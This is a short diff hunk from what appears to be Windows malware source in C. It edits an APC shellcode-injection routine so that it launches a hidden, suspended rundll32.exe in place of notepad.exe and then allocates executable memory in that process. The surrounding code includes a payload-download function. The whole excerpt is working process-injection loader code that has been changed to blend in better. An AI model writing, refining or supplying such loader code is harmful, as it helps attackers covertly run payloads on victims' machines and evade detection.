@@ -130,14 +130,14 @@ int download_payload() {
 }
 
 void inject_APC(unsigned char *sc, size_t l) {
-    char str_notepad[] = "C:\\Windows\\System32\\notepad.exe";
+    char str_target[] = "C:\\Windows\\System32\\rundll32.exe";
 
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = {0};
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
-    if (!CreateProcessA(str_notepad, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    if (!CreateProcessA(str_target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
         return;
 
     LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, l, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
